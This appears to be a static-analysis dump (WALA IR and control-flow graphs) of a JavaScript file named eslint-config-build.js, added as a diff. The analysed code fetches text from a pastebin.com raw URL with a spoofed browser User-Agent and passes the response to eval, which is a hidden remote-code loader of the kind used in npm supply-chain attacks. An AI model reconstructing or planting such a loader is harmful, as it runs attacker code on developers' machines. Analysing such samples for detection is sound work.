@@ -1,0 +1,449 @@
+<Code body of function Leslint-config-build.js>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..6]
+    -> BB2
+    -> BB17
+BB2[7..7]
+    -> BB3
+    -> BB17
+BB3[8..11]
+    -> BB4
+    -> BB17
+BB4[12..19]
+    -> BB5
+    -> BB17
+BB5[20..20]
+    -> BB6
+    -> BB16
+BB6[21..21]
+    -> BB7
+    -> BB17
+BB7[22..22]
+    -> BB8
+    -> BB17
+BB8[23..24]
+    -> BB9
+    -> BB17
+BB9[25..25]
+    -> BB10
+    -> BB16
+BB10[26..26]
+    -> BB11
+    -> BB17
+BB11[27..27]
+    -> BB12
+    -> BB17
+BB12[28..28]
+    -> BB13
+    -> BB17
+BB13[29..31]
+    -> BB14
+    -> BB16
+BB14[32..36]
+    -> BB15
+    -> BB16
+BB15[37..37]
+    -> BB17
+BB16[38..39]
+    -> BB17
+BB17[-1..-2]
+Instructions:
+BB0
+BB1
+0   v1 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [0->670] (line 1) [1=[arguments]]
+1   v3 = global:global $$undefined           eslint-config-build.js [35->50] (line 2) [3=[https, $$destructure$rcvr4]]
+3   v5 = global:global $$undefined           eslint-config-build.js [218->670] (line 11) [5=[e]]
+5   v9 = global:global Object                eslint-config-build.js [47->49] (line 2)
+6   check v9                                 eslint-config-build.js [47->49] (line 2)
+BB2
+7   v7 = construct v9@7 exception:v10        eslint-config-build.js [47->49] (line 2) [7=[https, $$destructure$rcvr4]]
+BB3
+9   v14 = global:global Function             eslint-config-build.js [51->215] (line 3)
+10   v11 = construct v14@10 v13:#Leslint-config-build.js/eslint-config-build.js@63 exception:v12eslint-config-build.js [51->215] (line 3)
+11   fieldref v7.v16:#get = v11 = v11        eslint-config-build.js [51->215] (line 3) [7=[https, $$destructure$rcvr4]16=[$$destructure$elt4]]
+BB4
+18   v24 = global:global Object              eslint-config-build.js [272->501] (line 13)
+19   check v24                               eslint-config-build.js [272->501] (line 13)
+BB5
+20   v23 = construct v24@20 exception:v25    eslint-config-build.js [272->501] (line 13)
+BB6
+21   fieldref v23.v26:#hostname = v27:#pastebin.com = v27:#pastebin.comeslint-config-build.js [272->501] (line 13)
+BB7
+22   fieldref v23.v28:#path = v29:#/raw/XLeVP82h = v29:#/raw/XLeVP82heslint-config-build.js [272->501] (line 13)
+BB8
+23   v32 = global:global Object              eslint-config-build.js [345->500] (line 14)
+24   check v32                               eslint-config-build.js [345->500] (line 14)
+BB9
+25   v31 = construct v32@25 exception:v33    eslint-config-build.js [345->500] (line 14)
+BB10
+26   fieldref v31.v34:#User-Agent = v35:#Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0 = v35:#Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0eslint-config-build.js [345->500] (line 14)
+BB11
+27   fieldref v31.v36:#Accept = v37:#text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 = v37:#text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8eslint-config-build.js [345->500] (line 14)
+BB12
+28   fieldref v23.v30:#headers = v31 = v31   eslint-config-build.js [272->501] (line 13)
+BB13
+29   v41 = global:global Function            eslint-config-build.js [262->638] (line 13)
+30   v38 = construct v41@30 v40:#Leslint-config-build.js/eslint-config-build.js@504 exception:v39eslint-config-build.js [262->638] (line 13)
+31   v22 = dispatch v16:#get@31 v7,v23,v38 exception:v43eslint-config-build.js [262->638] (line 13) [22=[$$destructure$rcvr3]16=[$$destructure$elt4]7=[https, $$destructure$rcvr4]]
+BB14
+34   v50 = global:global Function            eslint-config-build.js [262->657] (line 21)
+35   v47 = construct v50@35 v49:#Leslint-config-build.js/eslint-config-build.js@650 exception:v48eslint-config-build.js [262->657] (line 21)
+36   v45 = dispatch v44:#on@36 v22,v46:#error,v47 exception:v51eslint-config-build.js [262->657] (line 21) [44=[$$destructure$elt3]22=[$$destructure$rcvr3]]
+BB15
+37   goto (from iindex= 37 to iindex = -1)   eslint-config-build.js [218->670] (line 11)
+BB16<Handler> (<JavaScriptLoader,LRoot>)
+           v52 = getCaughtException 
+BB17
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@650)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@650>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@504)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@504>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@63)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@63>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<Code body of function Leslint-config-build.js/eslint-config-build.js@63>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..3]
+    -> BB2
+    -> BB5
+BB2[4..4]
+    -> BB3
+    -> BB5
+BB3[5..7]
+    -> BB4
+    -> BB5
+BB4[8..8]
+    -> BB5
+BB5[-1..-2]
+Instructions:
+BB0
+BB1
+0   v5 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [63->215] (line 3) [5=[arguments]]
+1   v8 = global:global __WALA__int3rnal__globaleslint-config-build.js [100->212] (line 4)
+2   v11 = global:global Object               eslint-config-build.js [109->211] (line 4)
+3   check v11                                eslint-config-build.js [109->211] (line 4)
+BB2
+4   v9 = construct v11@4 exception:v12       eslint-config-build.js [109->211] (line 4)
+BB3
+5   v17 = global:global Function             eslint-config-build.js [109->211] (line 4)
+6   v14 = construct v17@6 v16:#Leslint-config-build.js/eslint-config-build.js@63/eslint-config-build.js@123:on exception:v15eslint-config-build.js [109->211] (line 4)
+7   fieldref v9.v13:#on = v14 = v14          eslint-config-build.js [109->211] (line 4)
+BB4
+8   v6 = invoke v4@8 v8,v9 exception:v18     eslint-config-build.js [100->212] (line 4) [4=[callback]]
+BB5
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@63/eslint-config-build.js@123:on)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@63/eslint-config-build.js@123:on>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<Code body of function Leslint-config-build.js/eslint-config-build.js@504>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..5]
+    -> BB2
+    -> BB4
+BB2[6..12]
+    -> BB3
+    -> BB4
+BB3[13..19]
+    -> BB4
+BB4[-1..-2]
+Instructions:
+BB0
+BB1
+0   v4 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [504->637] (line 14) [4=[arguments]]
+5   v9 = dispatch v8:#setEncoding@5 v3,v10:#utf8 exception:v11eslint-config-build.js [518->539] (line 15) [8=[$$destructure$elt5]3=[r, $$destructure$rcvr8]]
+BB2
+10   v20 = global:global Function            eslint-config-build.js [549->599] (line 16)
+11   v17 = construct v20@11 v19:#Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@562 exception:v18eslint-config-build.js [549->599] (line 16)
+12   v15 = dispatch v14:#on@12 v3,v16:#data,v17 exception:v23eslint-config-build.js [549->599] (line 16) [14=[$$destructure$elt8]3=[r, $$destructure$rcvr8]]
+BB3
+17   v31 = global:global Function            eslint-config-build.js [609->629] (line 19)
+18   v28 = construct v31@18 v30:#Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@622 exception:v29eslint-config-build.js [609->629] (line 19)
+19   v26 = dispatch v14:#on@19 v3,v27:#error,v28 exception:v32eslint-config-build.js [609->629] (line 19) [14=[$$destructure$elt8]3=[r, $$destructure$rcvr8]]
+BB4
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@562)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@562>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<ctor for <JavaScriptLoader,LFunction>(Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@622)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@622>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<Code body of function Leslint-config-build.js/eslint-config-build.js@63/eslint-config-build.js@123:on>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..2]
+    -> BB2
+BB2[-1..-2]
+Instructions:
+BB0
+BB1
+0   v5 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [123->205] (line 5) [5=[arguments]]
+1   v8 = global:global __WALA__int3rnal__globaleslint-config-build.js [165->194] (line 6)
+2   v6 = invoke v4@2 v8,v9:#__SOURCE_INTERNET exception:v10eslint-config-build.js [165->194] (line 6) [4=[callback]]
+BB2
+
+
+<Code body of function Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@562>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..2]
+    -> BB2
+    -> BB3
+BB2[3..4]
+    -> BB3
+BB3[-1..-2]
+Instructions:
+BB0
+BB1
+0   v4 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [562->598] (line 16) [4=[arguments]]
+1   v7 = global:global eval                  eslint-config-build.js [580->584] (line 17)
+2   check v7                                 eslint-config-build.js [580->584] (line 17)
+BB2
+3   v9 = global:global __WALA__int3rnal__globaleslint-config-build.js [580->587] (line 17)
+4   v5 = invoke v7@4 v9,v3 exception:v10     eslint-config-build.js [580->587] (line 17) [3=[c]]
+BB3
+
+
+<Code body of function Leslint-config-build.js/eslint-config-build.js@504/eslint-config-build.js@622>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..0]
+    -> BB2
+BB2[-1..-2]
+Instructions:
+BB0
+BB1
+0   v3 = new <JavaScriptLoader,LArray>@0     eslint-config-build.js [622->628] (line 19) [3=[arguments]]
+BB2
+
+
